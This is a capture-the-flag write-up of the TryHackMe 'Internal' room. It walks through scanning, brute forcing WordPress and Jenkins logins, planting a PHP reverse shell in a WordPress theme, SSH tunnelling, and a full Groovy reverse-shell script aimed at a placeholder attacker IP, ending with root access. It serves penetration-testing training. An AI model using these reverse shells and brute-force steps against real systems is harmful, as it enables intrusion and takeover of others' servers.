---
title: Internal
description: Internal box from TryHackMe! write up.
---

# Internal <a href='/assets/resources/TryHackMe!/Internal-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

[Link to the room](https://tryhackme.com/room/internal) (Add `internal.thm` to `hosts` file before start!)

## Let's start!

First lets try to get what ports are open:

```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: internal.thm
------------------------------------------------------------
Scanning target internal.thm
Time started: 2021-05-14 13:09:55.201429
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:20.447794
------------------------------------------------------------
```

Nice, now the typical `nmap` scan:

```
┌──(kali㉿kali)-[~/Desktop/THM/Internal]
└─$ nmap -sV -sC -p22,80 -oN nmapScan.txt internal.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 13:12 EDT
Nmap scan report for internal.thm
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
```

Just `ssh` and a default apache page... ok, lets start by checking that web.

### Webpage enumeration

First thing i want to try is gobuster to check for interesting directories:

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/14 13:15:25 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 313] [--> http://internal.thm/blog/]
/wordpress            (Status: 301) [Size: 318] [--> http://internal.thm/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://internal.thm/phpmyadmin/]
===============================================================
2021/05/14 13:20:36 Finished
===============================================================
```

A blog with wordpress and access to the phpmyadmin page. The phpmyadmin looks like doesn't allow login without password so let's check Wordpress. Let's use `wpscan` and `nmap`:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV --script http-wordpress-enum --script-args root="/blog" internal.thm 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 13:48 EDT
Nmap scan report for internal.thm (internal.thm)
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   themes
|     twentyseventeen 2.3
|   plugins
|_    akismet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
```

To be honest i first used `wpscan` to check for themes or installed plugins to check if some of them were outdated but wasn't really helpful so i tried a brute force attack with `rockyou` knowing that `xmlrpc` was enabled. Checking through the Wordpress i found that the admin user was called admin, yeah original, so we can just specify this as the username we want the password from:

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog/ --passwords rockyou.txt --usernames admin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [internal.thm]
[+] Started: Fri May 14 13:53:36 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=============================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                 
Trying admin / princess7 Time: 00:02:19 <                                                                          > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri May 14 13:56:06 2021
[+] Requests Done: 4058
[+] Cached Requests: 5
[+] Data Sent: 2.045 MB
[+] Data Received: 2.647 MB
[+] Memory used: 255.074 MB
[+] Elapsed time: 00:02:30

```

Oh boy, oh boy! That actually worked cool! So we have admin access to Wordpress now with: `admin:my2boys`

#### Wordpress dashboard

Once here we can really just get a reverse shell but i found something. There is a private post in the Wordpress that contains something really interesting:

```
To-Do

Don't forget to reset Will's credentials. william:arnold147
```

So more credentials nice!: `william:arnold147` Before trying to get a reverse shell i will try the credentials we already know in `ssh`, remember that it was open. After some trying for a while i wasn't able to use them to login through `ssh`, sad, but hey we still can get a reverse shell so let's go for it.

##### Reverse shell

To get a reverse shell from Wordpress i will go to the theme editor and change the 404 page template with php reverse shell code. Once that is done, i setup my netcat listenner: `nc -lnvp 8080` and tried to access a non existant article in wordpress, i noticed that the `/wordpress` directory gobuster found just do that so let's go:

```
──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.9.82.69] from (UNKNOWN) [internal.thm] 59962
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:22:28 up  1:27,  0 users,  load average: 0.00, 0.02, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

To stabilize the shell execute `python -c 'import pty; pty.spawn("/bin/bash")'`, then `ctrl-z` to suspend the process, execute `stty raw -echo; fg`, hit enter to get the reverse shell prompt again and lastly just `export TERM=xterm`.


### Privesc to user

First thing i want to check is if the wordpress installation has something for me, this is what i got:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
```

I checked the database in the `/phpmyadmin` directory using this credentials but nothing interesting there. No interesting `SUID` files neither, and `linpeas` wasn't helping neither. After some manual enumeration i found something in the `opt` directory:

```
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

So we got the user credentials: `aubreanna:bubb13guM!@#123` Just login to the accound and get the flag:
```
aubreanna@internal:~$ cat /home/aubreanna/user.txt 
THM{*******************}
```

### Privesc to root

First thing, during the first enumeration phase as www-data i couldn't really find something of interest to get root using exploits for outdated things so we will have to continue with the manual enumeration. Let's check our groups:

```
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```
That adm group will allow me to read logs so we can try that later if necessary. I also saw a `jenkins.txt` file in our `home` folder:

```
Internal Jenkins service is running on 172.17.0.2:8080
```

I will use `ssh` tunneling to access this from my machine, first:

```
ssh -N -p 22 aubreanna@internal.thm -L 2000:localhost:8080
```

Use aubreanna credentials and the jenkins server is now available from `localhost:2000`. After some basic enumeration a used metasploit to try a bruteforce attack in the default admin user:
```
msf> use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS localhost
RHOSTS => localhost
msf6 auxiliary(scanner/http/jenkins_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/jenkins_login) > set RPORT 2000
RPORT => 2000
msf6 auxiliary(scanner/http/jenkins_login) > set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/jenkins_login) > set PASSWORD ""
PASSWORD => 
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /home/kali/rockyou.txt
PASS_FILE => /home/kali/rockyou.txt
msf6 auxiliary(scanner/http/jenkins_login) > run
...
[-] 127.0.0.1:2000 - LOGIN FAILED: root:michael (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:ashley (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:qwerty (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:111111 (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:iloveu (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:000000 (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:michelle (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:tigger (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:sunshine (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:chocolate (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:password1 (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:soccer (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:anthony (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:friends (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:butterfly (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:purple (Incorrect)
[-] 127.0.0.1:2000 - LOGIN FAILED: root:angel (Incorrect)
.....
127.0.0.1:2000 - Login Successful: admin:spongebob <---
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Another reverse shell?

So the jenkins credentials are `admin:spongebob` cool. Let's get another reverse shell, just going to `Manage Jenkins` and then clicking on `Script Console` will send me to the `/script` path where using `Revsh.groovy` alongside a netcat listenner will give a shell:

```
String host="ATACKER_IP";
int port=8080;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080           
listening on [any] 8080 ...
connect to [10.9.82.69] from (UNKNOWN) [internal.thm] 48720
ls
bin
boot
...
```

After the shell is stabilized let's start enumerating. Turns out this guys love the `opt` folder because again there is something interesting in there. This `note.txt` file contains this:

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```

Can this be true? That easy? Lets try to `ssh` into the machine with that credentials (According with `linpeas` root access is allowed):
```
┌──(kali㉿kali)-[~]
└─$ ssh root@internal.thm
root@internal.thm's password:
....
Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~#
```

It worked omg! Let's get the flag:

```
root@internal:~# cat /root/root.txt 
THM{*******************}
```
